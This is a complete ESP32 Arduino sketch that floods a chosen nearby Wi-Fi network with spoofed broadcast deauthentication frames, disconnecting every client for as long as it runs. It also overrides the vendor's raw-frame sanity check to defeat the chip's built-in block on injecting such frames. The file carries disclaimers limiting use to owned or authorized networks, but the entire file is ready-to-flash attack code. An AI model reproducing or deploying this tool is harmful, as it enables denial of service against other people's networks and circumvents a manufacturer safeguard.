/*
 * ESP32 standalone deauth flood - FOR AUDITING NETWORKS YOU OWN OR ARE
 * EXPLICITLY AUTHORIZED TO TEST ONLY.
 *
 * Does nothing but scan for nearby networks, let you pick one, then
 * continuously send deauth frames (spoofed as the AP, to broadcast) to
 * knock every connected device off that network for as long as this
 * sketch keeps running. No capture, no cracking - just disconnection.
 *
 * Uses the same technique as ESP32Marauder to bypass Espressif's normal
 * block on raw deauth-frame injection: override
 * ieee80211_raw_frame_sanity_check() so the linker prefers this
 * application's definition over the restrictive one in libnet80211.a
 * (requires -Wl,--allow-multiple-definition, already set via
 * platform.local.txt in the ESP32 core install), and transmit via
 * WIFI_IF_AP instead of WIFI_IF_STA, since the block is STA-side only.
 *
 * Only select a network and clients you own or are explicitly authorized
 * to test. This disconnects every device on the selected network for as
 * long as it runs.
 */

#include <WiFi.h>
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3) {
  return 0;
}

#define DEAUTH_BURST_COUNT 10
#define DEAUTH_BURST_INTERVAL_MS 2000  // how often to re-send the burst
#define MAX_NETWORKS 40

static uint8_t targetBSSID[6];
static int targetChannel = 0;
static String targetSSID;
static unsigned long lastBurstMs = 0;
static unsigned long burstsSent = 0;

// Standard 802.11 deauth frame, source+BSSID spoofed as the AP, dest = broadcast.
static uint8_t deauthFrame[26] = {
  0xC0, 0x00,                         // Frame Control: type=mgmt, subtype=deauth
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1: destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2: source (AP BSSID, filled at runtime)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3: BSSID (filled at runtime)
  0x00, 0x00,                         // Sequence control
  0x07, 0x00                          // Reason code: Class 3 frame from nonassociated STA
};

void sendDeauthBurst() {
  memcpy(&deauthFrame[10], targetBSSID, 6);
  memcpy(&deauthFrame[16], targetBSSID, 6);
  for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    delay(20);
  }
  burstsSent++;
  lastBurstMs = millis();
  Serial.printf("STATUS: deauth burst #%lu sent (%d frames) to broadcast, spoofed AP %02X:%02X:%02X:%02X:%02X:%02X\n",
    burstsSent, DEAUTH_BURST_COUNT,
    targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
}

const char *authModeStr(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA-PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2-PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2-PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK: return "WPA3-PSK";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3-PSK";
    default: return "UNKNOWN";
  }
}

// Reads one line from Serial, blocking until Enter is pressed.
String readSerialLine() {
  String line = "";
  while (true) {
    if (Serial.available()) {
      char c = Serial.read();
      if (c == '\n' || c == '\r') {
        if (line.length() > 0) return line;
      } else {
        line += c;
      }
    }
    delay(10);
  }
}

// Scans nearby networks, prints a numbered list, and blocks until the user
// picks one by typing its number (or 'r' to rescan) over Serial.
void selectTargetNetworkInteractive() {
  int n;
  while (true) {
    Serial.println("\nScanning for nearby networks...");
    n = WiFi.scanNetworks(false, true);
    if (n <= 0) {
      Serial.println("No networks found. Rescanning in 3s...");
      delay(3000);
      continue;
    }
    if (n > MAX_NETWORKS) n = MAX_NETWORKS;

    Serial.println("\n#   SSID                             CH  RSSI  ENC            BSSID");
    for (int i = 0; i < n; i++) {
      uint8_t *bssid = WiFi.BSSID(i);
      Serial.printf("%-3d %-32s %-3d %-5d %-14s %02X:%02X:%02X:%02X:%02X:%02X\n",
        i + 1,
        WiFi.SSID(i).c_str(),
        WiFi.channel(i),
        WiFi.RSSI(i),
        authModeStr(WiFi.encryptionType(i)),
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    }
    Serial.println("\nWARNING: this will disconnect every device on the network you pick.");
    Serial.println("Type the number of the network to target, or 'r' to rescan:");

    String choice = readSerialLine();
    choice.trim();
    if (choice.equalsIgnoreCase("r")) continue;

    int idx = choice.toInt();
    if (idx < 1 || idx > n) {
      Serial.println("Invalid selection, try again.");
      continue;
    }

    idx -= 1;
    targetSSID = WiFi.SSID(idx);
    targetChannel = WiFi.channel(idx);
    memcpy(targetBSSID, WiFi.BSSID(idx), 6);
    Serial.printf("\nTargeting \"%s\" on channel %d, BSSID %02X:%02X:%02X:%02X:%02X:%02X, RSSI %d\n",
      targetSSID.c_str(), targetChannel,
      targetBSSID[0], targetBSSID[1], targetBSSID[2],
      targetBSSID[3], targetBSSID[4], targetBSSID[5],
      WiFi.RSSI(idx));
    return;
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // AP_STA (not just STA) is required so WIFI_IF_AP is a valid, started
  // interface for the deauth raw-frame transmission below.
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  delay(100);

  selectTargetNetworkInteractive();

  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

  Serial.printf("Locked to channel %d for \"%s\". Flooding deauth frames every %dms - reflash or reset to stop.\n",
    targetChannel, targetSSID.c_str(), DEAUTH_BURST_INTERVAL_MS);
  sendDeauthBurst();
}

void loop() {
  if (millis() - lastBurstMs > DEAUTH_BURST_INTERVAL_MS) {
    sendDeauthBurst();
  }
  delay(50);
}
